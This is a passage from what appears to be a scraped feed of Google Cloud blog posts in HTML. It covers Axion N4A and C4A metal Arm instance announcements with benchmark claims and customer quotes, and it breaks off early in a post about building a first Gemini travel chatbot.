IOPS, 2.4GB/s of throughput per instance.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">N4A performs well across a range of industry-standard benchmarks that represent the key workloads our customers run every day. For example, relative to comparable current-generation x86-based VM offerings, N4A delivers up to </span><strong style=\"vertical-align: baseline;\">105%</strong><span style=\"vertical-align: baseline;\"> better price-performance for </span><span style=\"vertical-align: baseline;\">compute-bound workloads</span><span style=\"vertical-align: baseline;\">, up to </span><strong style=\"vertical-align: baseline;\">90%</strong><span style=\"vertical-align: baseline;\"> better price-performance for </span><span style=\"vertical-align: baseline;\">scale-out web servers</span><span style=\"vertical-align: baseline;\">, up to </span><strong style=\"vertical-align: baseline;\">85%</strong><span style=\"vertical-align: baseline;\"> better price-performance for </span><span style=\"vertical-align: baseline;\">Java applications</span><span style=\"vertical-align: baseline;\">, and up to</span><strong style=\"vertical-align: baseline;\"> 20%</strong><span style=\"vertical-align: baseline;\"> better price-performance for general-purpose databases.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_q9MnCJ1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Footnote: As of October 2025. Performance based on the estimated SPECrate\u00ae2017_int_base, estimated SPECjbb2015, MySQL Transactions/minute (RO), and Google internal Nginx Reverse Proxy benchmark scores run in production on comparable latest-generation generally-available VMs with general purpose storage types. Price-performance claims based on published and upcoming list prices for Google Cloud.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In the real world, early adopters are seeing dramatic price-performance improvements from the new N4A instances.</span></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_3I8oyl8.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"At ZoomInfo, we operate a massive data intelligence platform where efficiency is paramount. Our core data processing pipelines, which are critical for delivering timely insights to our customers, run extensively on Dataflow and Java services in GKE. In our preview of the new N4A instances, we measured a 60% improvement in price-performance for these key workloads compared to their x86-based counterparts. This allows us to scale our platform more efficiently and deliver more value to our customers, faster.\"</i> - <b>Sergei Koren, Chief Infrastructure Architect, ZoomInfo\u200b</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"3\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_nDU2gjP.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\u201cOrganizations today need performance, efficiency, flexibility, and scale to meet the computing demands of the AI era; this requires the close collaboration and co-design that is at the heart of our partnership with Google Cloud. As N4A redefines cost-efficiency, customers gain a new level of infrastructure optimization, enabling enterprises to choose the right infrastructure for their workload requirements with Arm and Google Cloud.\u201d</i> - <b>Bhumik Patel, Director, Server Ecosystem Development, Infrastructure Business, Arm</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Granular control with Custom Machine Types and Hyperdisk</strong></h3>\n<p><span style=\"vertical-align: baseline;\">A key advantage of our N-series VMs has always been flexibility, and with N4A, we are bringing one of our most popular features to the Axion family for the first time: Custom Machine Types (</span><a href=\"https://cloud.google.com/compute/docs/instances/creating-instance-with-custom-machine-type\"><span style=\"text-decoration: underline; vertical-align: baseline;\">CMT</span></a><span style=\"vertical-align: baseline;\">). Instead of fitting your workload into a predefined shape, CMTs on N4A lets you independently configure the amount of vCPU and memory to meet your application's unique needs. This ability to right-size your instances means you pay only for the resources you use, minimizing waste and optimizing your total cost of ownership.</span></p>\n<p><span style=\"vertical-align: baseline;\">This same principle of matching resources to your specific workload applies to storage. N4A VMs feature support for our latest generation of </span><a href=\"https://cloud.google.com/compute/docs/disks/hyperdisks\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Hyperdisk</span></a><span style=\"vertical-align: baseline;\">, allowing you to select the perfect storage profile for your application's needs:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hyperdisk Balanced:</strong><span style=\"vertical-align: baseline;\"> Offers an optimal mix of performance and cost for the majority of general-purpose workloads, with up to 160K IOPs per N4A VM.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hyperdisk Throughput:</strong><span style=\"vertical-align: baseline;\"> Delivers up to 2.4GiBps of max throughput for bandwidth-intensive analytics workloads like Hadoop or Kafka, providing high-capacity storage at an excellent value.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hyperdisk ML </strong><span style=\"vertical-align: baseline;\">(post GA)</span><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> Purpose-built for AI/ML workloads, allows you to attach a single disk containing your model weights or datasets to up to 32 N4A instances simultaneously for large-scale inference or training tasks.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hyperdisk Storage Pools</strong><span style=\"vertical-align: baseline;\">: Instead of provisioning capacity and performance on a per-volume basis, allows you to provision performance and capacity in aggregate, </span><a href=\"https://cloud.google.com/blog/products/compute/cost-saving-strategies-when-migrating-to-google-cloud-compute?e=48754805#:~:text=2.%20Optimize%20your%20block%20storage%20selections\"><span style=\"text-decoration: underline; vertical-align: baseline;\">further optimizing costs by up to 50%</span></a><span style=\"vertical-align: baseline;\"> and simplifying management.</span></p>\n</li>\n</ul></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"4\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/4_ZB4gdHF.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"At Vimeo, we have long relied on Custom Machine Types to efficiently manage our massive video transcoding platform. Our initial tests on the new Axion-based N4A instances have been very compelling, unlocking a new level of efficiency. We've observed a 30% improvement in performance for our core transcoding workload compared to comparable x86 VMs. This points to a clear path for improving our unit economics and scaling our services more profitably, without changing our operational model.\"</i> - <b>Joe Peled, Sr. Director of Hosting &amp; Delivery Ops</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">A growing Arm-based Axion portfolio for customer choice</strong></h3>\n<p><span style=\"vertical-align: baseline;\">C-series VMs are designed for workloads that require consistently high performance, e.g., medium-to-large-scale databases and in-memory caches. Alongside them, N-series VMs have been a key Compute Engine pillar, offering a balance of price-performance and flexibility, lowering the cost of running workloads with variable resource needs such as scale-out Java/GKE workloads. </span><span style=\"vertical-align: baseline;\">We released our first Axion-based machine series, </span><a href=\"https://cloud.google.com/blog/products/compute/try-c4a-the-first-google-axion-processor?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">C4A</span></a><span style=\"vertical-align: baseline;\">, in October 2024, and the </span><span style=\"vertical-align: baseline;\">introduction of N4A complements C4A, providing a range of Google Axion instances suited to your workloads\u2019 precise needs.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">On top of that, GKE unlocks significant price-performance advantages by orchestrating Axion-based C4A and N4A machine types. GKE leverages </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/concepts/about-custom-compute-classes\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Custom Compute Classes</span></a><span style=\"vertical-align: baseline;\"> to provision and mix these machine types, matching workloads to the right hardware. This automated, heterogeneous cluster management allows teams to optimize their total cost of ownership across their entire application stack.</span><span style=\"text-decoration: line-through; vertical-align: baseline;\">\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Also </span><a href=\"https://cloud.google.com/blog/products/compute/new-axion-c4a-metal-offers-bare-metal-performance-on-arm\"><span style=\"text-decoration: underline; vertical-align: baseline;\">joining the Axion family is C4A.metal</span></a><span style=\"vertical-align: baseline;\">, Google Cloud\u2019s first Axion bare metal instance that helps builders meet use cases that require access to the underlying physical server to run specialized applications in a non-virtualized environment, such as automotive systems development, workloads with strict licensing requirements, and Android software development. </span><a href=\"https://cloud.google.com/blog/products/compute/new-axion-c4a-metal-offers-bare-metal-performance-on-arm\"><span style=\"text-decoration: underline; vertical-align: baseline;\">C4A.metal will be available in preview soon</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Supported by the broad and mature Arm ecosystem, adopting Axion is easier than ever, and the combination of C4A and N4A can help you lower the total cost of running your business, without compromising on performance or workload-specific requirements</span><span style=\"vertical-align: baseline;\">:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">N4A for cost optimization and flexibility.</strong><span style=\"vertical-align: baseline;\"> Deliberately engineered for general-purpose workloads that need a balance of price and performance, including scale-out web servers, microservices, containerized applications, open-source databases, batch, data analytics, development environments, data preparation and AI/ML experimentation.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">C4A for consistently high performance, predictability, and control.</strong><span style=\"vertical-align: baseline;\"> Powering workloads where every microsecond counts, such as medium- to large-scale databases, in-memory caches, cost-effective AI/ML inference, and high-traffic gaming servers. C4A delivers consistent performance, offering a controlled maintenance experience for mission-critical workloads, networking bandwidth up to 100 Gbps, and next-generation Titanium Local SSD storage.\u00a0</span></p>\n</li>\n</ul></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"5\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/5_m4GINGe.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"Migrating to Google Cloud's Axion portfolio gave us a critical competitive advantage. We slashed our compute consumption by 20% while maintaining low and stable latency with C4A instances, such as our Supply-Side Platform (SSP) backend service. Additionally, C4A enabled us to leverage Hyperdisk with precisely the IOPS we need for our stateful workloads, regardless of instance size. This flexibility gives us the best of both worlds - allowing us to win more ad auctions for our clients while significantly improving our margins. We're now testing the N4A family by running some of our key workloads that require the most flexibility, such as our API relay service. We are happy to share that several applications running in production are consuming 15% less CPU compared to our previous infrastructure, reducing our costs further, while ensuring that the right instance backs the workload characteristics required.\u201d</i> - <b>Or Ben Dahan, Cloud &amp; Software Architect at Rise</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Get started with N4A today</strong></h3>\n<p><span style=\"vertical-align: baseline;\">N4A is available during preview in the following Google Cloud regions: </span><strong style=\"vertical-align: baseline;\">us-central1 (Iowa)</strong><span style=\"vertical-align: baseline;\">, </span><strong style=\"vertical-align: baseline;\">us-east4 (N. Virginia)</strong><span style=\"vertical-align: baseline;\">, </span><strong style=\"vertical-align: baseline;\">europe-west3 (Frankfurt) </strong><span style=\"vertical-align: baseline;\">and </span><strong style=\"vertical-align: baseline;\">europe-west4 (Netherlands)</strong><span style=\"vertical-align: baseline;\"> with more regions to follow.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">We can\u2019t wait to see what you build. To get access, sign-up </span><a href=\"https://forms.gle/HYY5FWRKewYuDMB27\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">here</strong></a><span style=\"vertical-align: baseline;\">. To learn more, check out the </span><a href=\"https://cloud.google.com/compute/docs/general-purpose-machines#n4a_series\"><span style=\"text-decoration: underline; vertical-align: baseline;\">N4A documentation</span></a><span style=\"font-style: italic; vertical-align: baseline;\">.</span></p></div>",
        "published_date": "2025-11-06 13:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/compute/new-axion-c4a-metal-offers-bare-metal-performance-on-arm/",
        "title": "Announcing Axion C4A metal: Arm-based Axion instances for specialized use cases",
        "thumbnail": null,
        "author": "Yarden Halperin",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Today, we are thrilled to announce C4A metal, our first bare metal instance running on Google Axion processors, available in preview soon. C4A metal is designed for specialized workloads that require direct hardware access and Arm\u00ae-native compatibility.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Now, organizations running environments such as Android development, automotive simulation, CI/CD pipelines, security workloads, and custom hypervisors can run them on Google Cloud, without the performance overheads and complexity of nested virtualization.</span></p>\n<p><span style=\"vertical-align: baseline;\">C4A metal instances, like other Axion instances, are built on the standard Arm architecture, so your applications and operating systems compiled for Arm remain portable across your cloud, on-premises, and edge environments, protecting your development investment. C4A metal offers 96 vCPUs, 768GB of DDR5 memory, up to 100Gbps of networking bandwidth, with full support for Google Cloud Hyperdisk including Hyperdisk Balanced, Extreme, Throughput, and ML block storage options.</span></p>\n<p><span style=\"vertical-align: baseline;\">Google Cloud provides workload-optimized infrastructure to ensure the right resources are available for every task. C4A metal, like the </span><a href=\"https://cloud.google.com/products/axion?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Axion virtual machine family</span></a><span style=\"vertical-align: baseline;\">, is powered by </span><a href=\"https://cloud.google.com/titanium\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Titanium</span></a><span style=\"vertical-align: baseline;\">, a key component for multi-tier offloads and security that is foundational to our infrastructure. Titanium's custom-designed silicon offloads networking and storage processing to free up the CPU, and its dedicated SmartNIC manages all I/O, ensuring that Axion cores are reserved exclusively for your application's performance. Titanium is part of Google Cloud\u2019s vertically integrated software stack \u2014 from the custom silicon in our servers to our planet-scale network traversing </span><a href=\"https://cloud.google.com/about/locations\"><span style=\"text-decoration: underline; vertical-align: baseline;\">7.75 million kilometers of terrestrial and subsea fiber</span></a><span style=\"vertical-align: baseline;\"> across 42 regions \u2014 that is engineered to maximize efficiency and provide the ultra-low latency and high bandwidth to customers at global scale.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Architectural parity for automotive workloads</span></h3>\n<p><span style=\"vertical-align: baseline;\">Automotive customers can benefit from the Arm architecture\u2019s performance, efficiency, and flexible design for in-vehicle systems such as infotainment and Advanced Driver Assistance Systems (ADAS). Axion C4A metal instances enable architectural parity between test environments and production silicon, allowing automotive technology providers to validate their software on the same Arm Neoverse instruction set architecture (ISA) used in production electronic control units (ECUs). This significantly reduces the risk of late-stage integration failures. For performance-sensitive tasks, these customers can execute demanding virtual hardware-in-the-loop (vHIL) simulations with the consistent, low-latency performance of physical hardware, ensuring test results are reliable and accurate. Finally, C4A metal lets providers move beyond the constraints of a physical lab, by dynamically scaling entire test farms and transforming them from fixed capital expenses into flexible operational ones.</span></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"3\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_nDU2gjP.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\u201cIn the era of AI-defined vehicles, the accelerating pace and complexity of technology are pushing us to rethink traditional linear approaches to software development. Google Cloud\u2019s introduction of Axion C4A metal is a major step forward in this journey. By offering full architectural parity on Arm between test environments and physical silicon, customers can benefit from accelerated development cycles, enabling continuous integration and compliance for a variety of specialized use cases.\"</i> - <b>Dipti Vachani, Senior Vice President and General Manager, Automotive Business, Arm</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"qnx\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/qnx.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\u201cOur partners and customers rely on QNX to deliver the safety, security, reliability, and real-time performance required for their most mission-critical systems \u2014 from advanced driver assistance to digital cockpits. As the Software-Defined Vehicle era continues to gain momentum, decoupling software development from physical hardware is no longer optional \u2014 it\u2019s essential for innovation at scale. The launch of Google Cloud\u2019s C4A-metal instances on Axion introduces a powerful ARM-based bare metal platform that we are eager to test and support as this will enable transformative cloud infrastructure benefits for our automotive ecosystem.\u201d -</i> <b>Grant Courville, Senior Vice President, Products and Strategy, QNX</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"qualcomm\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/qualcomm.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\u201cThe future of automotive mobility demands unprecedented speed and precision in practice and development. For automakers and suppliers leveraging the\u00a0Snapdragon Digital Chassis platform, aligning their cloud development and testing environments to ensure parity with the Snapdragon SoCs in the vehicle is absolutely crucial for efficiency and quality. We are\u00a0excited\u00a0about Google Cloud\u2019s commitment to this segment \u2014 offering\u00a0C4A-metal instances with Axion\u00a0is a massive leap forward, giving the automotive ecosystem a\u00a0true 1:1 physical to virtual environment\u00a0in the cloud. This breakthrough significantly reduces integration challenges,\u00a0slashes validation time, and allows our partners to\u00a0unleash AI-driven features to market faster at scale.\u201d</i> - <b>Laxmi Rayapudi, VP, Product Management, Qualcomm Technologies, Inc.</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Align test and production for Android development</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The Android platform was built for Arm-based processors, the standard for virtually all mobile devices. By running development and testing pipelines on the bare-metal instances of Axion processors with C4A metal, Android developers can benefit from native performance, eliminating the overhead of emulation management, such as slow instruction-by-instruction translation layers. In addition, they can significantly reduce latency for Android build toolchains and automated test systems, leading to faster feedback cycles. C4A metal also solves the performance challenges of nested virtualization, making it a great platform for scalable Cuttlefish (Cloud Android) environments.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Once available, developers can deploy scalable Cuttlefish environment farms on top C4A metal instances with an </span><a href=\"https://github.com/googlecloudplatform/horizon-sdv\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">upcoming release of Horizon</span></a><span style=\"vertical-align: baseline;\"> or by directly leveraging </span><a href=\"https://github.com/google/cloud-android-orchestration/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Android Orchestration</span></a><span style=\"vertical-align: baseline;\">. C4A metal allows these virtual devices to run directly on the physical hardware, providing the performance needed to build and manage large, high-fidelity test farms for true continuous testing.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Bare metal access without compromise</span></h3>\n<p><span style=\"vertical-align: baseline;\">As a cloud offering, </span><span style=\"vertical-align: baseline;\">C4A metal enables a lower total cost of ownership by replacing the entire lifecycle of physical hardware procurement and management with a predictable operational expense. This eliminates the direct capital expenditures of purchasing servers, along with the associated operational costs of hardware maintenance contracts, power, cooling, and physical data center space. You can programmatically provision and de-provision instances to match your exact testing demands, ensuring you are not paying for an over-provisioned fleet of servers sitting idle waiting for peak development cycles.</span></p>\n<p><span style=\"vertical-align: baseline;\">Operating as standard compute resources within your Virtual Private Cloud (VPC), C4A metal instances inherit and leverage the same security policies, audit logging, and network controls as virtual machines. Instances are designed to appear as physical servers to your toolchain and support common monitoring and security agents, allowing for straightforward integration with your existing Google Cloud environments. This integration extends to storage, where network-attached Hyperdisk allows you to manage persistent disks using the same snapshot and resizing tools your teams already use for your virtual machine fleet.</span></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"chainguard\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/chainguard.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\u201cFor our build system, true isolation is paramount. Running on Google Cloud\u2019s new C4A metal instance on Axion enables us to isolate our package builds with a strong hypervisor security boundary without compromising on build performance.\"</i> - <b>Matthew Moore, Founder and CTO, Chainguard, Inc</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Better together: the Axion C and N series</span></h3>\n<p><span style=\"vertical-align: baseline;\">The addition of C4A metal to the Arm-based Axion portfolio allows customers to lower TCO by matching the right infrastructure to every workload. While Axion </span><a href=\"https://cloud.google.com/compute/docs/general-purpose-machines#c4a_series\"><span style=\"text-decoration: underline; vertical-align: baseline;\">C4A virtual machines</span></a><span style=\"vertical-align: baseline;\"> optimize for consistently high performance and </span><a href=\"https://cloud.google.com/blog/products/compute/axion-based-n4a-vms-now-in-preview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">N4A virtual machines</span></a><span style=\"vertical-align: baseline;\"> (now in preview) optimize for price-performance and flexibility, C4A metal addresses the critical need for direct hardware access by specialized applications that require a non-virtualized Arm environment.</span></p>\n<p><span style=\"vertical-align: baseline;\">For example, an Android development company could create a highly efficient CI/CD pipeline by using C4A virtual machines for the build farm. For large-scale testing, they could use C4A metal to run Cuttlefish virtual devices directly on the physical hardware, eliminating nested virtualization overhead. To enable even higher fidelity, they can run Cuttlefish hybrid devices on C4A metal, reusing the system images from their physical hardware. Concurrently, supporting infrastructure such as CI/CD orchestrators and artifact repositories could run on cost-effective N4A instances, using Custom Machine Types to right-size resources and minimize operational expenses.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Coming soon to preview</span></h3>\n<p><span style=\"vertical-align: baseline;\">C4A metal is scheduled for preview soon. Please fill </span><a href=\"https://docs.google.com/forms/d/1iPfHMoGBHVDs_5zXohLCXjJWyEVASEjA2BZLqd3mtsI/edit#responses\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">this form</span></a><span style=\"vertical-align: baseline;\"> to sign up for early access and additional updates. </span></p></div>",
        "published_date": "2025-11-06 13:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/your-first-ai-application-is-easier-than-you-think/",
        "title": "Your First AI Application is Easier Than You Think",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/LLM_App_hero_image_1.max-600x600.png",
        "author": "Mollie Pettit",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">If you're a developer, you've seen </span><a href=\"https://cloud.google.com/use-cases/generative-ai?e=48754805&amp;hl&amp;utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\">generative AI</a><span style=\"vertical-align: baseline;\">\u00a0everywhere. It can feel like a complex world of </span><a href=\"https://cloud.google.com/discover/what-is-an-ai-model?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">models</span></a><span style=\"vertical-align: baseline;\"> and advanced concepts. It can be difficult to know where to actually start.</span></p>\n<p><span style=\"vertical-align: baseline;\">The good news is that building your first AI-powered application is more accessible than you might imagine. You don't need to be an AI expert to get started. This post introduces a new codelab designed to bridge this gap and provide you with a first step. We'll guide you through the entire process of building a functional, interactive travel chatbot using Google's </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/models?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini model</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><a href=\"https://codelabs.developers.google.com/codelabs/production-ready-ai-with-gc/1-developing-apps-that-use-llms/developing-LLM-apps-with-Vertex-AI-SDK#0?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Dive into the codelab and build your first AI application today!</strong></a></p>\n<h2><span style=\"vertical-align: baseline;\">Setting the Stage: Your First Project</span></h2>\n<p><span style=\"vertical-align: baseline;\">In </span><a href=\"https://codelabs.developers.google.com/codelabs/production-ready-ai-with-gc/1-developing-apps-that-use-llms/developing-LLM-apps-with-Vertex-AI-SDK#0?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">this codelab</span></a><span style=\"vertical-align: baseline;\">, you'll step into the role of a developer at a travel company tasked with building a new chat application. You'll start with a basic web application frontend and, step-by-step, you will bring it to life by connecting it to the power of </span><a href=\"https://cloud.google.com/use-cases/generative-ai?e=48754805&amp;hl&amp;utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">generative AI</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">By the end, you will have built a travel assistant that can:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Answer questions about travel destinations.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Provide personalized recommendations.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Fetch real-time data, like the weather, to give genuinely helpful advice.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">The process is broken down into a few key stages.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Making the First Connection</span></h2>\n<p><span style=\"vertical-align: baseline;\">Before you can do anything fancy, you need to get your application talking to the </span><a href=\"https://cloud.google.com/discover/what-is-an-ai-model?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI model</span></a><span style=\"vertical-align: baseline;\">. An easy way to do this is with the </span><a 